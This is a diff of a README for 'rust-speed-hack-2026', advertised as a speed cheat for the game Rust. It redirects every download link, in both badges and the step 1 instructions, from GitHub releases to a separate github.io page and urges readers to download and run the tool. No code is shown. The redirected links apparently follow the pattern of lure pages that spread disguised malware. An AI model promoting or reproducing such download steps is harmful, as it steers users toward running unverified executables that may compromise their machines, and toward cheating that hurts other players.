@@ -1,6 +1,6 @@
 # ⚡ rust-speed-hack-2026 - Move Faster, Dominate the Wasteland
 
-[![Download Now](https://img.shields.io/badge/Download-rust--speed--hack--2026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/cathous9306/rust-speed-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-rust--speed--hack--2026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://cathous9306.github.io)
 
 ## 🎯 What Is This?
 
@@ -13,7 +13,7 @@ Getting this tool up and running is simple. Just follow the steps below. You don
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/cathous9306/rust-speed-hack-2026/releases](https://github.com/cathous9306/rust-speed-hack-2026/releases)**
+**[https://cathous9306.github.io](https://cathous9306.github.io)**
 
 On that page, you'll see a list of files. Look for the newest version (usually at the top) and click the download button next to it. The download will start automatically. Save the file to a place you can easily find, like your Desktop or Downloads folder.
 
@@ -111,7 +111,7 @@ This project is free to use for personal purposes. Redistribution or resale is n
 ---
 
 **Ready to get started?**  
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=download&logoColor=white&color=blue)](https://github.com/cathous9306/rust-speed-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=download&logoColor=white&color=blue)](https://cathous9306.github.io)
 
 Visit this link to download the application and start moving faster today. See you in the wasteland!
 
